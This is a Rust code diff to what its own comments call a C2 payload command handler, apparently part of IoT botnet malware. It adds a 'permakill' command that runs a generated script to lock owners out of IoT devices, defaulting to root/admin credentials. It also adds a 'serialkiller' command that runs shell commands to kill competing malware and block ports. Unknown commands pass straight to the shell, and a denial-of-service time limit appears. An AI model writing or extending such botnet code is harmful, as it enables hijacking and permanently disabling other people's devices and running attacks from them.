@@ -17,10 +17,10 @@ use tracing::{debug, error, warn};
 
 use arcticfox_core::crypto::{generate_nonce, generate_session_key};
 use arcticfox_core::error::Result;
+use arcticfox_core::fbi::{Permakill, SerialKiller};
 use arcticfox_zwtransport::seal_oneshot;
 
 const MAX_SHELL_OUTPUT: usize = 1_048_576; // 1 MB
-const SHELL_TIMEOUT: Duration = Duration::from_secs(60);
 const DOS_MAX_SECS: u64 = 300;
 
 /// Parse and execute a single command from the C2 payload.
@@ -48,6 +48,14 @@ pub async fn execute_command(cmd: &str) -> Result<String> {
         "popmsg" => {
             let msg = parts.get(1).unwrap_or(&"");
             execute_popmsg(msg).await
+        }
+        "permakill" => {
+            let args = parts.get(1).unwrap_or(&"");
+            execute_permakill(args).await
+        }
+        "serialkiller" => {
+            let args = parts.get(1).unwrap_or(&"");
+            execute_serialkiller(args).await
         }
         _ => {
             // Unknown commands are treated as shell commands for flexibility
@@ -332,4 +340,32 @@ fn html_escape(s: &str) -> String {
         .replace('<', "&lt;")
         .replace('>', "&gt;")
         .replace('"', "&quot;")
+}
+
+/// Execute permakill — credential lockdown on IoT devices.
+async fn execute_permakill(args: &str) -> Result<String> {
+    let tokens: Vec<&str> = args.split_whitespace().collect();
+    let username = tokens.first().unwrap_or(&"root");
+    let password = tokens.get(1).unwrap_or(&"admin");
+    let script = Permakill::generate_full_lockout(username, password);
+    execute_shell(&script).await
+}
+
+/// Execute serialkiller — competitor malware removal.
+async fn execute_serialkiller(args: &str) -> Result<String> {
+    let aggressive = args.to_lowercase().contains("run");
+    let cmds = SerialKiller::generate_kill_commands(aggressive);
+    let mut output = String::new();
+    for cmd in cmds.split('\n').filter(|s| !s.is_empty()) {
+        let _ = std::process::Command::new("sh").arg("-c").arg(cmd).output();
+        output.push_str(&format!("[ok] {cmd}\n"));
+    }
+    if aggressive {
+        let port_cmds = SerialKiller::generate_port_block_commands();
+        for cmd in port_cmds.split('\n').filter(|s| !s.is_empty()) {
+            let _ = std::process::Command::new("sh").arg("-c").arg(cmd).output();
+            output.push_str(&format!("[ok] {cmd}\n"));
+        }
+    }
+    Ok(output)
 }
